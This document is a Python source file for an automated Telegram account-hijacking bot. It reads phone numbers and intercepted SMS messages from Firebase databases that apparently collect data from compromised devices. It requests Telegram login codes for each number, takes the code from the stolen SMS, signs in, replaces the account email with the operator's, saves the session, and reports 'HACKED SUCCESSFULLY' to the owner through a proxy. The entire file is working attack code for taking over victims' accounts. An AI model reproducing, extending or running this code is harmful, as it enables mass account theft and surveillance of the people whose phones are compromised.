import asyncio
import logging
import time
import random
import traceback
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, RPCError
from pyrogram.enums import SentCodeType
import config
import database as db
from services.warp_manager import get_warp_proxy, start_warp
import firebase_utils as fbu

log = logging.getLogger("TGAuto")
_WARP_READY = False

async def ensure_warp():
    global _WARP_READY
    if not _WARP_READY:
        _WARP_READY = await start_warp()
    return _WARP_READY

async def update_owner_progress(bot, text):
    try:
        await bot.send_message(config.MAIN_OWNER, f"🤖 <b>AI PROGRESS:</b>\n{text}", parse_mode="HTML")
    except:
        pass

# 🚨 NO TIMEOUT OTP WAITER (Firebase se)
async def wait_for_firebase_otp(phone_number):
    clean_phone = ''.join(filter(str.isdigit, phone_number))[-10:]
    while True:
        try:
            d = db.load_data()
            fbs = d.get("firebases", [])
            for fb in fbs[:10]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                for dev_id, c in clients.items():
                    if not isinstance(c, dict) or c.get("status") is not True: continue
                    best_nums = fbu.extract_best_numbers(c, [])
                    if best_nums and best_nums[0][0] == clean_phone:
                        msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10", fb.get("auth"))
                        if msgs:
                            for m in msgs.values():
                                if isinstance(m, dict) and m.get("type") == "incoming":
                                    txt = m.get("message", "").lower()
                                    if "telegram" in txt:
                                        otp = fbu.extract_otp(txt)
                                        if otp: return otp
        except: pass
        await asyncio.sleep(1) # Har 1 sec me check

# 🚨 THE INFINITE HUNTER
async def auto_hunter_loop(bot):
    log.info("🔥 GHATAK AUTO-HUNTER STARTED (NO BREAK)...")
    while True:
        try:
            d = db.load_data()
            if not d.get("hunting_enabled", True):
                await asyncio.sleep(10)
                continue

            # 1. Get all online devices from Firebase
            online_devices = []
            for fb in d.get("firebases", [])[:10]:
                clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                if not clients or not isinstance(clients, dict): continue
                for dev_id, c in clients.items():
                    if isinstance(c, dict) and c.get("status") is True:
                        online_devices.append((fb, dev_id, c))

            # 2. Loop through ALL devices, send OTP request to Telegram
            for fb, dev_id, dev_data in online_devices:
                best_nums = fbu.extract_best_numbers(dev_data, [])
                if not best_nums: continue
                
                phone = f"+91{best_nums[0][0]}"
                
                # Check if already logged in
                if phone in d.get("telegram_accounts", {}) and d["telegram_accounts"][phone].get("status") == "active":
                    continue
                
                await update_owner_progress(bot, f"🎯 Target: <code>{phone}</code> (Device: {dev_id[:6]})\n⏳ Sending OTP Request to Telegram...")
                
                # Setup Proxy
                proxy_dict = None
                if await ensure_warp(): proxy_dict = get_warp_proxy()
                
                app = Client(f"temp_{phone.replace('+','')}", api_id=config.TG_API_ID, api_hash=config.TG_API_HASH, phone_number=phone, in_memory=True, proxy=proxy_dict)
                
                try:
                    await app.connect()
                    sent_code = await app.send_code(phone)
                    
                    # 🚨 Check Code Type
                    if sent_code.type == SentCodeType.EMAIL:
                        await update_owner_progress(bot, f"📧 <b>OTP gaya Email pe!</b>\nPhone: <code>{phone}</code>\nFirebase pe wait kar raha hu (SIM SMS)...")
                    else:
                        await update_owner_progress(bot, f"📱 <b>OTP gaya SMS pe!</b>\nPhone: <code>{phone}</code>\nFirebase se utha raha hu...")

                    # Wait for SMS OTP (Infinite)
                    otp = await wait_for_firebase_otp(phone)
                    
                    await update_owner_progress(bot, f"🔑 <b>OTP Mila!</b> <code>{otp}</code>\nLogin kar raha hu...")
                    
                    try:
                        await app.sign_in(phone, sent_code.phone_code_hash, otp)
                        await app.update_profile(email=config.MASTER_EMAIL)
                        
                        # Save session
                        session_string = await app.export_session_string()
                        d = db.load_data()
                        d["telegram_accounts"][phone] = {
                            "status": "active", 
                            "session": session_string, 
                            "device_id": dev_id,
                            "fb_url": fb['url']
                        }
                        db.save_data(d)
                        await update_owner_progress(bot, f"✅ <b>HACKED SUCCESSFULLY!</b>\nAccount: <code>{phone}</code>\nEmail set: {config.MASTER_EMAIL}")
                        
                    except SessionPasswordNeeded:
                        d = db.load_data()
                        d["telegram_accounts"][phone] = {"status": "failed", "reason": "2FA Enabled", "device_id": dev_id}
                        db.save_data(d)
                        await update_owner_progress(bot, f"⚠️ <b>2FA Enabled!</b>\nAccount: <code>{phone}</code>\nSkipping.")
                    
                    await app.disconnect()
                    
                except Exception as e:
                    if app.is_connected: await app.disconnect()
                    await update_owner_progress(bot, f"❌ <b>Failed:</b> <code>{phone}</code>\nError: {str(e)[:50]}")
                
                await asyncio.sleep(5) # Thoda gap, phir next device

            # Fir se loop start
            await asyncio.sleep(10)
            
        except Exception as e:
            log.error(f"Hunter Loop Error: {e}")
            await asyncio.sleep(10)
